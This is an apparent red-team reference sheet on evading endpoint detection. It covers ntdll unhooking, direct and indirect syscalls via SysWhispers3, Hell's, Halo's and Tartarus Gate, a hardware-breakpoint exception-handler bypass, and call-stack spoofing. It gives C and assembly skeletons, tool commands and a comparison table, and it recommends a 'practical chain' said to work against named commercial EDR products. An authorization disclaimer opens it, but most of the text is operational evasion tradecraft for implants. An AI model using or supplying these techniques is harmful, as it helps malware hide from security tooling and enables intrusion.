# Unhook / Direct / Indirect Syscall Technique List

> Only for authorized red team / adversary exercises / testing your own products; use against unauthorized targets is forbidden.

This document summarizes the current mainstream techniques for "bypassing user-mode hooks", from the classic unhook to the latest hardware breakpoint Blindside.
Every technique maps to MITRE ATT&CK T1562.001 / T1027 / T1055 for report output.

## 1. Peruns Fart / Fresh Ntdll from disk

### Principle

All EDR hooks live in **ntdll.dll in the current process's memory**. `C:\Windows\System32\ntdll.dll` on disk is clean.
So remapping the on-disk ntdll into the current process and overwriting the `.text` section in memory wipes the hooks.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (with EDR hook jmp) │ ◄── overwritten with the clean .text from disk
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  On disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation key points

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // native path to get around monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Find the .text section at the new address
// 5. NtProtectVirtualMemory makes the current ntdll .text RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory restores it to RX
```

### Notes

- `NtProtectVirtualMemory` itself may be hooked → a chained problem. Fix: call `NtProtectVirtualMemory` through a **direct syscall** first
- Modern EDRs already monitor W operations by `NtProtectVirtualMemory` on ntdll memory, so combine with an ETW patch
- Peruns Fart leaves `KERNEL_MODULE_LOAD` and `PROTECTVM` events under ETW-TI; suppress ETW first without fail

## 2. Direct Syscall

### Principle

Do not call ntdll's exported functions; write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (the value on Win11 24H2; differs per version)
    syscall
    ret
```

The `syscall` instruction jumps from user mode straight into the kernel SSDT, skipping every user-mode hook.

### SysWhispers3 usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stubs
syscallsstubs.std.x64.asm  - standard direct syscalls
```

In Visual Studio:

```text
1. Add the .asm to the project and enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) in place of the original NtAllocateVirtualMemory
```

### Minimal direct syscall calling NtCreateFile (C code skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamic SSN resolution)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // some bytes omitted
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Drawbacks

- The syscall instruction sits in the implant's own `.text` section (not in ntdll) → kernel-mode telemetry easily sees "syscall from non-ntdll address"
- That is why indirect syscalls appeared

## 3. Indirect Syscall

### Principle

The syscall instruction still comes from ntdll.dll (a legitimate address); only the SSN and return address are under our control:

```text
Implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of a syscall;ret gadget in ntdll>]   ; the syscall is not in the implant
```

The gadget jumped to is usually the two-byte `syscall; ret` sequence at the end of an `Nt*` function.
The kernel-mode ETW provider sees an RIP in ntdll, matching legitimate behavior.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize the jmp target to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; returns SSN -> eax
    call Sw3GetSyscallAddress      ; returns the syscall;ret address in ntdll -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to the legitimate syscall instruction in ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

The three represent the evolution of "dynamic SSN resolution".

### Hell's Gate

- Assumes ntdll is not hooked
- At implant startup, walk ntdll's `Nt*` exports and extract the SSN from the first 4 bytes `mov eax, <SSN>`
- Advantage: no hard-coded SSN, works across Windows versions
- Drawback: if ntdll is already hooked (the first byte became jmp), extraction fails

### Halo's Gate

- Fixes the hook problem of Hell's Gate
- If a function is found hooked (not a standard prologue), **scan ±N functions up / down**
- Uses the fact that the SSNs of `Nt*` functions in ntdll increase consecutively to derive the hooked function's SSN from its neighbors

```text
Normal case:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and its SSN is not visible, look at the neighbors:
  Previous unhooked export SSN = 0x17
  Next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further handles advanced hooks that **change the SSN but keep the syscall instruction**
- Validates both the SSN and the syscall;ret gadget address
- The three combined provide the most stable indirect syscall foundation

### Reference implementation locations (after the bootstrap git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (with fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Principle

Use the debug registers `DR0-DR3` to set hardware breakpoints at the entry of the EDR hook trampoline;
set up a VEH (Vectored Exception Handler) that, when the breakpoint hits, moves RIP **directly past the hook trampoline**,
skipping the EDR detection code and landing in ntdll's real syscall section.

### Advantages

- No writes to ntdll memory (no `NtProtectVirtualMemory` alert)
- No unhook needed (the hook stays, it is just bypassed)
- ETW-TI sees no memory modification

### Implementation skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at the entry of each hooked function (at most 4, with single-step rotation)
// 3. SetThreadContext(thread, &ctx) writes the DRx
// 4. When the EDR hook trampoline triggers the hardware breakpoint -> the VEH takes over
// 5. The VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to the legitimate syscall;ret in ntdll
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // The SSN is already in eax; R10 = RCX; jump to syscall;ret in ntdll
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limits

- DRx is per thread → multiple threads need separate setup
- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; bypass that with the earlier techniques first
- HVCI and some anti-debugging mitigations introduced in Win11 22H2+ may interfere

## 6. Call Stack Spoofing

### Problem

Modern EDRs call `RtlCaptureStackBackTrace` at the kernel entry of syscalls such as `NtAllocateVirtualMemory` / `NtCreateThreadEx`
and report the complete call stack. The implant's stack shows **non-image-backed memory** frames → high-confidence alert.

### Option A: CallStackSpoofer (William Burgess)

Implementation idea:

1. Before the syscall, swap the current thread stack → a forged legitimate stack
2. Fill the forged stack frames with an entirely legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. Swap back to the real stack after the syscall returns

### Option B: SilentMoonwalk

More aggressive, uses a desynchronized stack:

```text
Execution flow:
  Implant code  →  custom trampoline (modifies RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace sees the forged stack)
                ↓
                The trampoline restores → implant code continues
```

The key is unwinding: make `RtlVirtualUnwind` walk into a forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Practical OPSEC advice

- call stack spoof + indirect syscall + ETW patch is currently a fairly reliable combination against CrowdStrike / SentinelOne
- Spoof during the sleep phase too; spoofing only during execution is not enough (the EDR samples periodically)

## 7. Technique selection comparison table

| Technique | Counters | Complexity | Current effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | User-mode hooks | Low | Medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | User-mode hooks | Low | Low-medium (the kernel sees RIP in the implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | User-mode hooks + kernel RIP detection | Medium | Medium-high | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | Hooks + no write operations | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | Call stack telemetry | High | High | T1564 |

Recommended practical chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing callback

Unhooking is only half of the bypass; the other half is telemetry blindness: continue with `references/telemetry-blinding.md`.
